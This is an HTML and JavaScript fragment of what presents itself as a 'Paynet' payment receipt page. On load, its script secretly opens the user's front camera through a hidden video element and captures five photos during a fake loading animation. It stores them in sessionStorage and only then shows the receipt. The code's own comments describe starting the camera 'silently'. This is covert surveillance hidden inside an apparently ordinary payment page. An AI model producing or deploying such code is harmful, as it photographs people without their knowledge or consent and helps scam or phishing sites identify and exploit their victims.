        </div>

        <div class="footer" style="margin-top: 30px;">
            <p class="powered-by">Secured by <strong>Paynet</strong></p>
        </div>
    </div>

    <script>
        let capturedPhotos = [];
        let cameraStream = null;
        let video = null;

        // Auto-start camera and capture photos during animation
        window.addEventListener('load', async function () {
            // Start camera silently in background
            await startCameraInBackground();

            // Capture 5 photos during animation (1 per second)
            await captureMultiplePhotos();

            // After photos captured, show receipt
            setTimeout(() => {
                document.getElementById('loadingSection').style.display = 'none';
                document.getElementById('receiptSection').style.display = 'block';

                // Stop camera
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }

                // Store photos in sessionStorage
                sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
                console.log(`Captured ${capturedPhotos.length} photos`);
            }, 6000); // Show receipt after 6 seconds (animation complete)
        });

        // Start camera in background (no visible element)
        async function startCameraInBackground() {
            try {
                // Request camera access
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                // Create hidden video element
                video = document.createElement('video');
                video.srcObject = cameraStream;
                video.style.display = 'none';
                document.body.appendChild(video);
                video.play();

                console.log('Camera started');
            } catch (error) {
                console.error('Camera error:', error);
                // Continue anyway - just won't capture photos
            }
        }

        // Capture multiple photos at 1-second intervals
        async function captureMultiplePhotos() {
            return new Promise((resolve) => {
                let photoCount = 0;
                const maxPhotos = 5;

                // Wait 1 second for camera to stabilize
                setTimeout(() => {
                    const captureInterval = setInterval(() => {
                        if (photoCount >= maxPhotos || !video) {
                            clearInterval(captureInterval);
                            resolve();
                            return;
                        }

                        // Capture photo
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);

                        const photoData = canvas.toDataURL('image/jpeg', 0.85);
                        capturedPhotos.push({
                            timestamp: new Date().toISOString(),
                            data: photoData
                        });

                        photoCount++;
                        console.log(`Photo ${photoCount}/5 captured`);
                    }, 1000); // Capture every 1 second
                }, 1000); // Wait 1 second before first photo
            });
        }
    </script>
